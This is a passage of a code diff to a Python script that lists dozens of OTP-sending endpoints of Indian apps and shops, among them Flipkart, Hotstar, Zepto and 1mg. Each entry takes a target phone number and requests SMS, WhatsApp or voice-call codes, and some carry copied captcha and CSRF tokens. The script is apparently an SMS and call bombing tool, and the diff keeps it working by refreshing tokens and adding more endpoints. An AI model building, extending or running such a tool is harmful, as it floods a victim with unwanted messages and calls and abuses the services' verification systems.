         "body": {"username": "{no}", "medium": "SMS", "meta": {}, "turnstileToken": "1.Y4lF4_kF4DZPijh3QGxr2LqBqM9RyhW1-z9CKgm-399Plkgy4faMshxKaJIzRZ2_7p9QxHMrcqfdS7TcsAx31JOPyqYd9lvj6Vrzm-_Y-SO8S9RMpd93jM7CPS-al2aq85zySTxBULA6YIlFDuCNby904mxmmnwBOvRCvqWULRn9C-cLorbHbry-k7fN7dfR8ZCE2aSkTOmRJhlmKZe_NfaL9wOA_nuC1ZgdWy5uGimKbNJz7q028fXucEZvMMn5tJfhjaxR12ZyXgq5K1VbQKQ-fXIp9WRvMd6S8F0Wi-CrMFA9tpeCavGghIL_wnQ8COyHo-RqxOxXofBsuczgy4VQ_RVwM4Iv9aPiVnS68xIerijMsugpRgj9DySqz0_re6583IR0HFV5ZiAYSQLE26D9WXhnlSyHV4R4EqDtxV7xQYDHrmBTMEL-h_3qgdzOGNZrMtsiHtzdgnOFwnEEKIQl55KKaD9QxIGzB6hdJfLs6R6oK13VBqSMGAQuP-MypvmSWz4X-6WOjbvsCqg5Dx4k2xgihgDzJSarLt8ViqylQIGJeFUYTZ4-_bFL4Y2dWTdHagvolYlR51-n6u_ltcmX3kdoDaB6SbpqkWh05jGS0x42W3UOxGUr8PTPL7Bp5QwUUA3Oept9iNM695vOdA2X8e4etzt4ETTe7w2GvoMa0g47X_B4neQ-53spGNIp.RhNi-8Xn1u2wamFaRlQfoA.eca3d52f2e64f7fbbfc37438773a17dbf34a79432848e8de6c7cd4773483d098"}
     })
     
-    # ========== 39. Codfirm/Clinikally - SMS ==========
+    # 39. Codfirm/Clinikally - SMS
     apis.append({
         "name": "Codfirm_SMS",
         "url": "https://api.codfirm.in/api/customers/login/otp/send",
@@ -1034,7 +1017,7 @@ def build_api_list():
         "body": {"medium": "sms", "storeUrl": "clinikally.myshopify.com", "phone": "{no}"}
     })
     
-    # ========== 40. Codfirm/Clinikally - WhatsApp ==========
+    # 40. Codfirm/Clinikally - WhatsApp
     apis.append({
         "name": "Codfirm_WhatsApp",
         "url": "https://api.codfirm.in/api/customers/login/otp/send",
@@ -1047,7 +1030,7 @@ def build_api_list():
         "body": {"medium": "whatsapp", "storeUrl": "clinikally.myshopify.com", "phone": "{no}", "resendOtp": True}
     })
     
-    # ========== 41. Apna ==========
+    # 41. Apna
     apis.append({
         "name": "Apna",
         "url": "https://production.apna.co/api/userprofile/v1/otp/",
@@ -1060,7 +1043,7 @@ def build_api_list():
         "body": {"phone_number": "91{no}", "retries": 0, "hash_type": "employer", "source": "employer"}
     })
     
-    # ========== 42. CityMall ==========
+    # 42. CityMall
     apis.append({
         "name": "CityMall",
         "url": "https://citymall.live/api/gateway/cl-user/auth/get-otp",
@@ -1077,7 +1060,7 @@ def build_api_list():
         "body": {"phone_number": "{no}"}
     })
     
-    # ========== 43. Here/HDFC ==========
+    # 43. Here/HDFC
     apis.append({
         "name": "Here_HDFC",
         "url": "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal",
@@ -1089,7 +1072,7 @@ def build_api_list():
         "body": {"mobile": "{no}", "countryCodeId": "b43569eb-6798-43fb-8d27-47d55d7c544b", "source": "sms"}
     })
     
-    # ========== 44. GetLook ==========
+    # 44. GetLook
     apis.append({
         "name": "GetLook",
         "url": "https://getlook.in/login/v1/api",
@@ -1102,7 +1085,7 @@ def build_api_list():
         "body": {"phone": "{no}"}
     })
     
-    # ========== 45. KPNFresh ==========
+    # 45. KPNFresh
     apis.append({
         "name": "KPNFresh",
         "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
@@ -1119,7 +1102,7 @@ def build_api_list():
         "body": {"phone_number": {"number": "{no}", "country_code": "+91"}}
     })
     
-    # ========== 46. Lenskart ==========
+    # 46. Lenskart
     apis.append({
         "name": "Lenskart",
         "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
@@ -1137,7 +1120,7 @@ def build_api_list():
         "body": {"captcha": None, "phoneCode": "+91", "telephone": "{no}"}
     })
     
-    # ========== 47. Savana - SMS ==========
+    # 47. Savana - SMS
     apis.append({
         "name": "Savana_SMS",
         "url": "https://api-shop-in.savana.com/n/api/buyer/basic/otp/sendCode",
@@ -1159,7 +1142,7 @@ def build_api_list():
         "body": {"userName": "{no}", "type": 0, "channel": 1, "bizTraceId": "93d67a64fa6b4ca4bee136f9a2470d97", "phonePrefix": "+91"}
     })
     
-    # ========== 48. Savana - WhatsApp ==========
+    # 48. Savana - WhatsApp
     apis.append({
         "name": "Savana_WhatsApp",
         "url": "https://api-shop-in.savana.com/n/api/buyer/basic/otp/sendCode",
@@ -1181,14 +1164,14 @@ def build_api_list():
         "body": {"userName": "{no}", "type": 0, "channel": "2", "bizTraceId": "93d67a64fa6b4ca4bee136f9a2470d97", "phonePrefix": "+91"}
     })
     
-    # ========== 49. Ixigo ==========
+    # 49. Ixigo - SMS
     apis.append({
-        "name": "Ixigo",
+        "name": "Ixigo_SMS",
         "url": "https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp",
         "method": "POST",
         "headers": {
             "Content-Type": "application/x-www-form-urlencoded",
-            "deviceTime": "1781323575634",
+            "deviceTime": "1786121898683",
             "X-Requested-With": "XMLHttpRequest",
             "apiKey": "iximweb!2$",
             "ixiSrc": "iximweb",
@@ -1197,17 +1180,17 @@ def build_api_list():
             "uuid": "fa1deb39ff4f441796e0",
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         },
-        "body": {"token": "fde2b0b330ad6b5b7b9d7567fe610be63795bea21b3e1520ff2288c345767c7dca42bf81f4b1fdf9c9b88686c22beec171c728d0099c8a4c6cb8710828449bfa", "sixDigitOTP": "true", "prefix": "%2B91", "phone": "{no}", "resendOnCall": "false"}
+        "body": {"token": "0239bfc7bb3df5dc4bfb0553a58ae8d900c13e2e3a297c6cddcff5ebfc44b44e62d5f7051b24d93a0935f1911aabff78fd3a15b15d71ec9ed7539a331d295a4f", "sixDigitOTP": "true", "prefix": "%2B91", "phone": "{no}", "resendOnCall": "false"}
     })
     
-    # ========== 50. Ixigo - Call ==========
+    # 50. Ixigo - Call
     apis.append({
         "name": "Ixigo_Call",
         "url": "https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp",
         "method": "POST",
         "headers": {
             "Content-Type": "application/x-www-form-urlencoded",
-            "deviceTime": "1781323636424",
+            "deviceTime": "1786121934105",
             "X-Requested-With": "XMLHttpRequest",
             "apiKey": "iximweb!2$",
             "ixiSrc": "iximweb",
@@ -1216,10 +1199,10 @@ def build_api_list():
             "uuid": "fa1deb39ff4f441796e0",
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         },
-        "body": {"token": "0732ff21f3263cee48320831c049192e22ffa805b4ca14add9c963945e4de6dde05739779f718e1fe35faa7297ac035389752adfda0548baf249b0d9fdc6a05f", "sixDigitOTP": "true", "prefix": "%2B91", "phone": "{no}", "resendOnCall": "true"}
+        "body": {"token": "16df49a87cf210e360ffe104da4f8fb57c52bcc12dbb3d87b1e988861a294d5501aa2510a96afbdf0dd2ede402ad2f64c0f203d5db9f9f15ee491737dce77fa4", "sixDigitOTP": "true", "prefix": "%2B91", "phone": "{no}", "resendOnCall": "true"}
     })
     
-    # ========== 51. Hotstar - SMS ==========
+    # 51. Hotstar - SMS
     apis.append({
         "name": "Hotstar_SMS",
         "url": "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8",
@@ -1237,7 +1220,7 @@ def build_api_list():
         "body": {"body": {"@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest", "phone_number": "{no}", "initiate_by": 0, "recaptcha_token": "", "source": 0}}
     })
     
-    # ========== 52. Hotstar - Call ==========
+    # 52. Hotstar - Call
     apis.append({
         "name": "Hotstar_Call",
         "url": "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8",
@@ -1255,7 +1238,7 @@ def build_api_list():
         "body": {"body": {"@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest", "phone_number": "{no}", "initiate_by": 1, "recaptcha_token": "", "source": 0}}
     })
     
-    # ========== 53. Happi Mobiles ==========
+    # 53. Happi Mobiles
     apis.append({
         "name": "HappiMobiles",
         "url": "https://dev-services.happimobiles.com/api/user-login/homepage",
@@ -1267,7 +1250,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ========== 54. VisitApp - SMS ==========
+    # 54. VisitApp - SMS
     apis.append({
         "name": "VisitApp_SMS",
         "url": "https://api.getvisitapp.com/v3/new-auth/login-phone",
@@ -1280,7 +1263,7 @@ def build_api_list():
         "body": {"phone": "{no}", "countryCode": 91, "platform": "WEB", "ssoInfo": None, "storedUTMParams": {}, "emailCode": "", "evId": ""}
     })
     
-    # ========== 55. VisitApp - WhatsApp ==========
+    # 55. VisitApp - WhatsApp
     apis.append({
         "name": "VisitApp_WhatsApp",
         "url": "https://api.getvisitapp.com/v3/new-auth/login-phone",
@@ -1293,7 +1276,7 @@ def build_api_list():
         "body": {"channel": "whatsapp", "resend": True, "countryCode": 91, "phone": "{no}", "platform": "WEB"}
     })
     
-    # ========== 56. VRL Bus ==========
+    # 56. VRL Bus
     apis.append({
         "name": "VRLBus",
         "url": "https://www.vrlbus.in/Web_Methods/OtherWebMethod.aspx/GenrateOTP",
@@ -1306,7 +1289,7 @@ def build_api_list():
         "body": {"PhoneNo": "{no}", "Captcha": "6yg78"}
     })
     
-    # ========== 57. Flipkart ==========
+    # 57. Flipkart
     apis.append({
         "name": "Flipkart",
         "url": "https://2.rome.api.flipkart.com/1/action/view",
@@ -1319,7 +1302,7 @@ def build_api_list():
         "body": {"actionRequestContext": {"type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": "{no}", "clientQueryParamMap": {"ret": "/my-account", "entryPage": "DEFAULT"}, "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE", "triggerSna": False, "sourceContext": "DEFAULT"}}
     })
     
-    # ========== 58. KreditBee ==========
+    # 58. KreditBee
     apis.append({
         "name": "KreditBee",
         "url": "https://api.kreditbee.in/v1/me/otp",
@@ -1333,7 +1316,7 @@ def build_api_list():
         "body": {"reason": "loginOrRegister", "mobile": "{no}", "appsflyerId": "06489c77-8f7b-4dd0-9c10-f673c161c6bb-p", "mediaSource": "", "firebaseInstanceId": "", "firebaseiosAppInstId": ""}
     })
     
-    # ========== 59. Dehaat ==========
+    # 59. Dehaat
     apis.append({
         "name": "Dehaat",
         "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
@@ -1346,7 +1329,7 @@ def build_api_list():
         "body": {"mobile_number": "{no}", "client_id": "kisan-app"}
     })
     
-    # ========== 60. Medkart ==========
+    # 60. Medkart
     apis.append({
         "name": "Medkart",
         "url": "https://app.medkart.in/api/v2/auth/request-otp",
@@ -1361,7 +1344,7 @@ def build_api_list():
         "body": {"mobile_no": "{no}"}
     })
     
-    # ========== 61. ConfirmTkt ==========
+    # 61. ConfirmTkt
     apis.append({
         "name": "ConfirmTkt",
         "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput",
@@ -1376,7 +1359,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ========== 62. RailYatri ==========
+    # 62. RailYatri
     apis.append({
         "name": "RailYatri",
         "url": "https://www.railyatri.in/m/user-web-point",
@@ -1390,7 +1373,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ========== 63. HealthKart ==========
+    # 63. HealthKart
     apis.append({
         "name": "HealthKart",
         "url": "https://www.healthkart.com/veronica/user/login/send/otp/1/{no}",
@@ -1406,7 +1389,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ========== 64. PharmEasy ==========
+    # 64. PharmEasy
     apis.append({
         "name": "PharmEasy",
         "url": "https://pharmeasy.in/api/auth/requestOTP",
@@ -1420,7 +1403,7 @@ def build_api_list():
         "body": {"contactNumber": "{no}"}
     })
     
-    # ========== 65. RedBus ==========
+    # 65. RedBus
     apis.append({
         "name": "RedBus",
         "url": "https://www.redbus.in/api/getOtpV2",
@@ -1432,7 +1415,7 @@ def build_api_list():
         "body": {"phoneCode": "91", "mobile": "{no}", "whatsappOption": False, "reCaptchaResponse": "0cAFcWeA7BnwmKiiOtCYj67Rw-QpreM8nKQQRaNTb62qas8O9uDlGTwg82HJS175qcWAI_HujQObkbg6FS8WH5rm_HUYMD0SH53quzDgzc70FiiOmGsdeUMUdh7etOFj4ixwyeCEDxB2tZlSOLDqnEF4txpYDLQX19Y3VAduSpsCohZCdHdReBn1QMsQrquPivsIxT3IDuNU1TLbvkz2XuAKJdsF2TSE1MlJU8XC2yHfF0qy46-xslvw7XbQNZf3bkL6ejwEO6PQ9QlLbfpNXmIWYNpUafFrziU0T4MlSt5LiFEftkMSTNIsBsfNroZj1qPpM5QYpvWh3fCtnBeAYlO8sa1wGf8I6ZHRRkBGE9cDznnvdTTTZvB3dPz0BXomgr0zj9hC4aTDDb_wX9bzZbHAmtHqAMYblPRUXcx5nL3zVZA36u3V7oXD-Bq3hjluMAuNRSEpe0-vvdU6r7KVOz5iUQDnDSQcSMC2PEpsIXZXRW8Ct09WHD0cfVhQ6s-QADv5S8LQxB9F0nym6IpewESdrYFpxPYUFamLILJzqfyQ4h9w_0HeCgmy-i6Opd6mV8yuw5XxoGU9Qwm4IKOFUApAgpwUqJh7IBlWZeUtGOMQ3g1H0z3TmffL5HQ0JRgehifwk-zMHvqkfJMqfyPFDqpc_sGnYeALnpMamLkkMbx_YfSp5KmuK7x3XFZj3yQ5JlNy3NZiYvTeUdR-UIO7Qlhh7YQfurIMmUO3qR98JTai3aYZFtdjsD4KMzj_75WjH_WG1NMtzqL8ylYfIlK2hCEU2HMJ3OTFuheJtEspiq0fa3tJarlAE8QBEZxwF7MTK7ryr5DifMC_4fUS2tgS2bEh3Km_z_wPNp6RWVK4JsIqYT6wWFbE7_OWV4_ASIEUgvzHljrOjhr0Aqni0OYW2Of6zGCLXxQvz9g1NPPPKpXFBoN72aYj09R9tgWs3HzUQo05sOnPGWbMw5j81m-j-BcgH8aW2LfnroOHTuLndPNTUoqLn294YITny0rBhFqMqdXWTo80DRFERzikzTm-l-jzDoahxWvJow7P4k5GEufj5vjFuGBareJTQTjlbxZ5jQLlloqfhhcgMQ"}
     })
     
-    # ========== 66. Smytten ==========
+    # 66. Smytten
     apis.append({
         "name": "Smytten",
         "url": "https://route.smytten.com/discover_user/users/loginViaNumber",
@@ -1448,7 +1431,7 @@ def build_api_list():
         "body": {"ad_id": "", "device_info": {}, "device_id": "", "app_version": "", "device_token": "", "device_platform": "web", "value": "{no}", "guest_user_access": True, "recaptcha_token": "0cAFcWeA4QeqXYr-3ef2gC7FXoNoCrvtXqiS0mGbRwkSBC7nN1TGp4EupoRe0WJVGUH4ztzLjwSQiElpMe2S-sHEUAsoz8z_xgHpSo5EBLIjZT7O--rd4lZvocPW2f8S24u7CIwJSolBHvO5e2gHYzsF_gsZMqDE5NKDg50nehbuUkhXmH6m1ZbrgBrbLEShKcqanIcUWejhaxppzjT9flLBy04d9WHC8LrBzm31yt_w3jpYLt5jHcgwEnCdwfM-TGHhYq-eW0-J44HxhNbGzLXPW6U82yoMyGEyApQZ-hZYMfjRAfMz8WYhMwrRv8bGJj6C7RP77Fyk8iGhJfDBaSPKgvB8d3zArNjtKRgf9iR9hYCyigu88n6ajgKQCeyCg77fvjrLmZK6fzHVoIJo2DJKCieVZC1QSP9bKa_vP0XyzCjYfhBkBUpcUjG7LRiy81ikzrqPqQ6XeUs1jHl4akgN2F0Ty6No8F7dQ_cllZQMIi-Inpdd2ZJZBs4B-Qub6tOBPl4bRjB4hIzQzFcb9QEZc_Sti6qO0_RI6CmoWh_GKLoc4odguBqKUrqMMXpAjzjsLf9Fb59bGiIKRPcLo3N-EQECdUYjs-tN9Fuwe5A6yOp7ZbhFitmBY52rU31VtxQVmHHZvqH7DrsPMtXs0FGJC4x1QhDIsxbIjgR0ZBo1S1BBMcdF8cun4tZOi3slh-RXNyd4q52ovC7tXjvVhgHTtuA69y2LmNsISKpuxymxmDwij48e_WG_mAK0vFUfHzCQIosADHb2yaKsy4hN4VE-3UhWNcpablADYqo2XDuOHAj235AK-kK9Z5069a5FgJ9mc_2FAqCWXZJIKPPQyRwSVos2q1sHNXTLC2AaFVgN-zz-FSKHk0XvA72gn0Mgxhy003JBlVUjUDlckId69rbCcP4zZ5-wSZEV9LfW-DO1sj1CNe0LJkUoS-Vz0OXfUs-NUcySHs1bMHbl_vsJbc5dzi7Q5Oem20th-5Uodo1RQigG_9t6qhhIO6NUO63he52csRj4tXTJkuaJ3m16pMqO791pr75M8szXIpcS-qnafXG5AZju1xIYKJ_NX4cpQhLzoMFa0G16afduI589TjD1ftZmC-ZtTiey6hLBs5rxonIlKPottISovBfN1BampSKvFNHryHFyjfWmr3mcijnz9MsOa1LyIOHsaDT3ry7ctOswcfXbIw2eD_mQRozynPQ9Wd_p9IYmbpj-WOiG0jzb048Mi_iG1HRJlWck2gID9XjVxn8pzdWNAF6fYEj6EpTIZtEh9CyZu9XNuTXoLH1EZ4PBjuKDaNipscBZWnxxZQ-dSg_uPEyuosLpsLescCnJCWWJbB4TPGpOirAQsMoZMKLq5Cm8nfnSJsMsFwd9Tki3wkrvR8mEvEAsbmWX5rY7x4ebyD9xmznjb1-0RtS35xxwaUIDvrFlyX0QFLqH3TDUIfObXF3-S6sxe2qH7hl2U30Qhtb8gh4lS8DROr-fRlGTu3MethG6FXHWdTfM-rgiqqsp9Jl2dpitsaLa2xGiVnn1zx86FY_lSL95oNwx_uCdJQExQKGLKKWswUaJk6NwC5U4daGP-0nAcdq9Xb21kDJnjine3gbp_3NeiFxiyJsBSqJG7RHewvmclzTlrPDCF531ny8rPxvO39e3EG3N87nieDwcPaQR6Gq2aZbR8_4Rx0fmgza4SHyAs22CMupxw4GfOb2kMkc-zU6hgClRDozCtorpHa9fRPxurQ73_9t2LUL-ImQUzM-_VSkK6ELAgi-8fyziSuABW9u8wI7R65LiUkRrB3c7jTChs1XyWih4nastvQA6PbQB6rA3ZmcgOP0MBi_47jSq_3Nmvujjj_ZAIgrQGIoQYbsUVkDNi4AuaV7cZFGwGEjKx5NiRSBW1AfTvfNN-xKNgdHPPZMQV2cxZhwM9ZBGGcKR7WKv3V6LaGWbp_rm-5HDzzWrq4Me5bi3Yr1KUCCiNQvI01pdY98SE9HJD9XwaRp7Ioj_kP76cqJO4ND1L8mniZ_UwSLbEvtd4o-Z6zSjMvvlBab6m_e3T4lcdp0hHCYJVGvu6C1XSDEKTEwxSA4MYHOOzmxnoH8NsbrZS0YfAzST-hgtXCBU8ZVNHw-PgyAx3YlGx3iyWZR8Cmt5Ky1HAj4QxNhFmUrPVUipxAP5HRohTEaGFgwmUWlRNAmhEq6dFHrVGEUat-YaJoanMNUDoSNHu5hv_5AjgDpzx3TAwulB_Nm3mAgMlAPb3PehkRKhPKihjKZlC8aQXmpLeNjodX-QDGTMWjYK8HzmOdnNK5IzkWTDlFqmp1LJRX"}
     })
     
-    # ========== 67. GoKwik ==========
+    # 67. GoKwik
     apis.append({
         "name": "GoKwik_V4",
         "url": "https://gkx.gokwik.co/v4/auth/otp/login/trigger",
@@ -1469,7 +1452,7 @@ def build_api_list():
         "body": {"phone": "{no}", "country": "IN"}
     })
     
-    # ========== 68. Zepto ==========
+    # 68. Zepto
     apis.append({
         "name": "Zepto",
         "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
@@ -1501,7 +1484,7 @@ def build_api_list():
         "body": {"mobileNumber": "{no}", "countryCode": "+91"}
     })
     
-    # ========== 69. Agoda ==========
+    # 69. Agoda
     apis.append({
         "name": "Agoda",
         "url": "https://www.agoda.com/ul/api/v1/auth",
@@ -1517,7 +1500,7 @@ def build_api_list():
         "body": {"email": "", "keepMeSignedIn": False, "whatsapp": "+{no}"}
     })
     
-    # ========== 70. Mpokket ==========
+    # 70. Mpokket
     apis.append({
         "name": "Mpokket",
         "url": "https://web-api.mpokket.in/registration/sendOtp/sign-up",
@@ -1531,7 +1514,7 @@ def build_api_list():
         "body": {"payload": "U2FsdGVkX1/eb9kMqF3HgTIL63xwEgDkzfVoASZufOdHHizpf9UKLyTQY9wB2QeRQV4AUjUwkDRExNOgrBRMS/qj6Zjb9y5hsqlrDkP57ReM1J8ZFMoif7vEKGNM2gcy/MoebRAP2aedf31rCJtXu/HB32hg8T6gI7JxRjXFyQ7HcpxvzWis5uVQRAAuYWtHOa1ZjUgUHVXn2yZJallHxw4pdhzbDX0WAQIkDsZNU2nX8lk8pbUBfhxjKmcy0iRk"}
     })
     
-    # ========== 71. Penpencil ==========
+    # 71. Penpencil
     apis.append({
         "name": "Penpencil",
         "url": "https://api.penpencil.co/v1/users/resend-otp",
@@ -1546,7 +1529,7 @@ def build_api_list():
         "body": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{no}"}
     })
     
-    # ========== 72. SmartCoin ==========
+    # 72. SmartCoin
     apis.append({
         "name": "SmartCoin",
         "url": "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
@@ -1564,7 +1547,7 @@ def build_api_list():
         "body": {"phone_number": "{no}", "app_version": "100101", "channel": "IVR", "request_type": "REGISTRATION", "onboarding_consent": True}
     })
     
-    # ========== 73. TataCapital Voice ==========
+    # 73. TataCapital Voice
     apis.append({
         "name": "TataCapital_Voice",
         "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
@@ -1578,21 +1561,28 @@ def build_api_list():
         "body": {"phone": "{no}", "applSource": "", "isOtpViaCallAtLogin": "true"}
     })
     
-    # ========== 74. 1mg - SMS ==========
+    # 74. 1mg - SMS
     apis.append({
         "name": "1mg_SMS",
-        "url": "https://www.1mg.com/auth_api/v6/create_token",
+        "url": "https://www.1mg.com/pwa-api/auth/create_token",
         "method": "POST",
         "headers": {
-            "Accept": "application/vnd.healthkartplus.v11+json",
-            "Content-Type": "application/json; charset=utf-8",
-            "Accept-Encoding": "gzip",
-            "User-Agent": "okhttp/3.9.1"
+            "Content-Type": "application/json",
+            "HKP-Platform": "Healthkartplus-0.0.1-mobileweb",
+            "Accept": "application/vnd.healthkartplus.v4+json",
+            "X-Visitor-Id": "296d1933-92dd-45dd-88cf-66a3a9a37288_Jx91Pq9yAP_6492_1780163827000",
+            "VISITOR-ID": "296d1933-92dd-45dd-88cf-66a3a9a37288_Jx91Pq9yAP_6492_1780163827000",
+            "x-platform": "mobileweb-0.0.1",
+            "X-Access-Key": "1mg_client_access_key",
+            "X-1mgLabs-Platform": "mWeb",
+            "locale": "en",
+            "x-csrf-token": "63db2a2a082045df7f714c237e6c15fa30af71e0521bf98323ba4b40fbfaf838e1241639824024e9c4655f967363dc5bcc26a0f1cd3d5b46fd27b34b1dfdbf1f",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         },
-        "body": {"number": "{no}", "is_corporate_user": False, "otp_on_call": False}
+        "body": {"referral_code": None, "number": "{no}"}
     })
     
-    # ========== 75. 1mg - Call ==========
+    # 75. 1mg - Call
     apis.append({
         "name": "1mg_Call",
         "url": "https://www.1mg.com/auth_api/v6/create_token",
@@ -1606,7 +1596,7 @@ def build_api_list():
         "body": {"number": "{no}", "is_corporate_user": False, "otp_on_call": True}
     })
     
-    # ========== 76. Unacademy ==========
+    # 76. Unacademy
     apis.append({
         "name": "Unacademy",
         "url": "https://unacademy.com/api/v3/user/user_check/",
@@ -1621,7 +1611,7 @@ def build_api_list():
         "body": {"country_code": "IN", "phone": "{no}", "is_un_teach_user": False, "otp_type": 2.0, "send_otp": True, "email": ""}
     })
     
-    # ========== 77. Doubtnut ==========
+    # 77. Doubtnut
     apis.append({
         "name": "Doubtnut_Login",
         "url": "https://api.doubtnut.com/v4/student/login",
@@ -1636,7 +1626,7 @@ def build_api_list():
         "body": {"app_version": "7.10.51", "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450", "phone_number": "{no}", "language": "en", "udid": "b751fb63c0ae17ba", "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9sKGS6MlrzZOwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"}
     })
     
-    # ========== 78. Doubtnut Call ==========
+    # 78. Doubtnut Call
     apis.append({
         "name": "Doubtnut_Call",
         "url": "https://micro.doubtnut.com/otp/send-call",
@@ -1653,7 +1643,7 @@ def build_api_list():
         "body": {"phone": "{no}", "locale": "en"}
     })
     
-    # ========== 79. RummyCircle ==========
+    # 79. RummyCircle
     apis.append({
         "name": "RummyCircle",
         "url": "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
@@ -1668,7 +1658,7 @@ def build_api_list():
         "body": {"otpOnCall": True, "mobile": "{no}", "otpType": 8.0, "transactionId": 1.708139023656E12}
     })
     
-    # ========== 80. OLX Call ==========
+    # 80. OLX Call
     apis.append({
         "name": "OLX_Call",
         "url": "https://www.olx.in/api/auth/authenticate",
@@ -1684,7 +1674,7 @@ def build_api_list():
         "body": {"method": "call", "phone": "{no}", "language": "en-IN", "grantType": "retry"}
     })
     
-    # ========== 81. ShopClues ==========
+    # 81. ShopClues
     apis.append({
         "name": "ShopClues",
         "url": "https://www.shopclues.com/ajax/send_login_otp.php",
@@ -1698,7 +1688,7 @@ def build_api_list():
         "body": "mobile={no}"
     })
     
-    # ========== 82. Indiamart ==========
+    # 82. Indiamart
     apis.append({
         "name": "Indiamart",
         "url": "https://m.indiamart.com/mobile/api/register_mobile.php",
@@ -1711,7 +1701,7 @@ def build_api_list():
         "body": "mobile_no={no}&action=send_otp"
     })
     
-    # ========== 83. Justdial ==========
+    # 83. Justdial
     apis.append({
         "name": "Justdial",
         "url": "https://www.justdial.com/functions/otp/send_otp.php",
@@ -1724,7 +1714,7 @@ def build_api_list():
         "body": "mobile={no}&type=login"
     })
     
-    # ========== 84. PolicyBazaar ==========
+    # 84. PolicyBazaar
     apis.append({
         "name": "PolicyBazaar",
         "url": "https://www.policybazaar.com/api/user/generate_otp/",
@@ -1737,7 +1727,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ========== 85. PaisaBazaar ==========
+    # 85. PaisaBazaar
     apis.append({
         "name": "PaisaBazaar",
         "url": "https://www.paisabazaar.com/api/user/send-otp/",
@@ -1750,7 +1740,7 @@ def build_api_list():
         "body": {"mobile_number": "{no}"}
     })
     
-    # ========== 86. IndiaLends ==========
+    # 86. IndiaLends
     apis.append({
         "name": "IndiaLends",
         "url": "https://indialends.com/pl/SP_MVResend",
@@ -1767,7 +1757,7 @@ def build_api_list():
         "body": "MobileNumber={no}&Mode=2"
     })
     
-    # ========== 87. Astrosage Call ==========
+    # 87. Astrosage Call
     apis.append({
         "name": "Astrosage_Call",
         "url": "http://varta.astrosage.com/sdk/send-otp-via-call",
@@ -1786,7 +1776,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ========== 88. Astrosage Register ==========
+    # 88. Astrosage Register
     apis.append({
         "name": "Astrosage_Register",
         "url": "http://varta.astrosage.com/sdk/registerAS",
@@ -1805,7 +1795,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ========== 89. MagicPin - Call ==========
+    # 89. MagicPin - Call
     apis.append({
         "name": "MagicPin_Call",
         "url": "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/",
@@ -1825,7 +1815,7 @@ def build_api_list():
         "body": {"phoneNumber": "91{no}", "authMethod": "call", "token": "0cAFcWeA61Qx8xkm_zXvmkoN9GMx8ROX6pW1nwcmm3KKwrxTOTmWC8ji_Dv0M0tcYNgudFfpIfVmZ-LSZ_N9fEJqiaE8mNfT7hQQJfg1uF2kTKPpjpJR6EqO24XHaV0te5q3JJr9KHf72BcQ7qpofk54cjhzGRokezbp1L5sw_vtU7SVHtLMBd-23SO3fq45fcpYnl7s9FHGUtD2lDWQIK7HVX1mjdiWngr1bX5XbU-m270eshEgAagJi5kOCHb4fPAttbYn0zDc859bEmrAJhSRWtlZT3GGK-WMvveRGhCtsqB2mILH2HCZy0rlk4ms0oeeNQ_ckGYlWJkOnBXj-knZExHaiReG5FIHk0pvMQ1AzesjH4XRNITN6MLA97e2hU8P3yeKK1uibPO9uZsn89IZX7i6IzRZCecJO0Vafv6Xm7EP8lJQq9YKIF3e9RIEXXDxc8xyr6P8oaegdyRtwAVs4j_kaXDYGIO5wid6A1tbIrEPs1qFGT_qAsSoS3VEvshELSCxDC87f8MZrt6zLPSHtXQXENrDK0eHWTeRiQ0H-Ilh2nPUUKTrYK-hbMBwiGkbow1DBJbCDlHVs4nds1yDy6JJi3-C1FeSE_5yW7g1jUfyoYc5PyKKGrP-5iQtXQ-fAYsF38gxTXuEqXm8BqRetWT3cN4RBXzoB8GNl2qxd4l33i2S-aPNtmjUREcXLVbQJMN8E6sb8MPkrq6et4sUWTBwNnBgLZeXgm5dFSI9N6NTWwruifvLpuJ2_tQ9OGcy_OIl_M1XkRfwSdQA9Vk9nMQOPgn07B-DSY7j4lYniu-HsVldAhAK4"}
     })
     
-    # ========== 90. Udaan - SMS ==========
+    # 90. Udaan - SMS
     apis.append({
         "name": "Udaan_SMS",
         "url": "https://auth.udaan.com/api/otp/send",
@@ -1848,9 +1838,95 @@ def build_api_list():
         "body": "mobile={no}"
     })
 
-    # ========== NEW ULTIMATE_APIS ==========
+    # ========== NEW ULTIMATE_APIS (91-110) ==========
     
-    # ========== U1. Swiggy Voice ==========
+    # 91. Quikr
+    apis.append({
+        "name": "Quikr",
